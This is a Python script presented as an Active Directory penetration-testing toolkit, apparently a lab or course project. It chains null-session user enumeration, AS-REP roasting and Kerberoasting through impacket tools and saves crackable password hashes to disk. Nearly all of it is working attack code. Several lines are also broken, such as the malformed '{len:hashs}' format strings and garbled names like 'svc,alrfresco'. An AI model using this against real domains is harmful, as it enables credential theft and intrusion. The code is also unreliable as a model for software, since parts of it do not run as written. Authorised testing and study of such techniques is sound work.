#!/usr/bin/env python3
import argparse, json, os, subprocess, re
from datetime import datetime

class ADToolkit:
    def __init__(self, target_ip, domain, username=None, password=None):
        self.target = target_ip
        self.domain = domain
        self.username = username
        self.password = password
        os.makedirs("reports", exist_ok=True)
        os.makedirs("extracted", exist_ok=True)
        self.report = {"target": target_ip, "domain": domain,
                       "timestamp": datetime.utcnow().isoformat() + "Z",
                       "phases": {}}

    def run_cmd(self, cmd):
        try:
            res = subprocess.run(cmd, shell=True, capture_output=True,
                                text=True, timeout=60)
            return res.stdout.strip(), res.stderr.strip()
        except Exception as e:
            return "", str(e)

    def phase1_enumeration(self):
        print("\n[PHASE 1] ENUMERATION & AS-REP ROASTING")
        results = {}
        print(f"  [*] RPC null session on {self.target}...")
        out, err = self.run_cmd(
            f"rpcclient -U '' -N {self.target} -c 'enumdomusers'"
        )
        if "user:[" in out:
            print("    [+] Null session allowed!")
            users = re.findall(r"user:\[(.*?)\]", out)
            results["null_session_users"] = users
        else:
            print("    [-] Null session failed")
            results["null_session_users"] = []
        print("  [*] AS-REP Roasting...")
        userfile = "extracted/users.txt"
        default_users = ["svc,alrfresco", "sebastien", "lucinda", "andy", "mark", "santi"]
        with open(userfile, "w") as f:
            if results.get("null_session_users"):
                f.write("\n".join(results["null_session_users"]))
            else:
                f.write("\n".join(default_users))
        asrep_out = "extracted/asrep_hashes.txt"
        cmd = (f"GetNPUsers.py {self.domain}/ -usersfile {userfile} "
               f"-dc-ip {self.target} -format hashcat -outputfile {asrep_out}")
        out, err = self.run_cmd(cmd)
        if os.path.exists(asrep_out) and os.path.getsize(asrep_out) > 0:
            with open(asrep_out) as f:
                hashes = f.read().strip().split("\n")
            print(f"    [+] ASREP HASHES: {len:hashs}")
            for h in hashes[:3]:
                print(f"        {h[:80]}...")
            results["asrep_hashes"] = len(hashes)
        else:
            print("    [-] No ASREP hashes")
            results["asrep_hashes"] = 0
        self.report["phases"]["enumeration"] = results

    def phase2_kerberoasting(self):
        print("\n[PHASE 2] KERBEROASTING")
        if not self.username or not self.password:
            print("    [-] Skipping: No credentials")
            self.report["phases"]["kerberoasting"] = {"error": "no creds"}
            return
        print(f"  [*] Requesting TGS as {self.username}...")
        kerb_out = "extracted/kerb_hashes.txt"
        cmd = (f"GetUserSPNs.py {self.domain}/{self.username}:{self.password} "
               f"-dc-ip {self.target} -request -outputfile {kerb_out}")
        out, err = self.run_cmd(cmd)
        if os.path.exists(kerb_out) and os.path.getsize(kerb_out) > 0:
            with open(kerb_out) as f:
                hashes = f.read().strip().split("\n")
            print(f"    [+] KERBEROAST MASHES: {len:hashs}")
            self.report["phases"]["kerberoasting"] = {"hashes_found": len(hashes)}
        else:
            print("    [-] No Kerberoastable accounts")
            self.report["phases"]["kerberoasting"] = {"hashes_found": 0}

    def phase3_report(self):
        print("\n[PHASE 3] REPORT")
        ts = datetime.utcnow().strftime("%Y%m%d%H%M%S")
        path = f"reports/ad_report_{ts}.json"
        with open(path, "w") as f:
            json.dump(self.report, f,indent=2)
        print(f"    [OK] {path}")

    def run(self):
        print("=" * 60)
        print("  AD Penetration Testing Toolkit - Project #51")
        print("=" * 60)
        self.phase1_enumeration()
        self.phase2_kerberoasting()
        self.phase3_report()

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("-t", "--target", required=True)
    ap.add_argument("-d", "--domain", required=True)
    ap.add_argument("-u", "--username")
    ap.add_argument("-p", "--password")
    args = ap.parse_args()
    ADToolkit(args.target, args.domain, args.username, args.password).run()
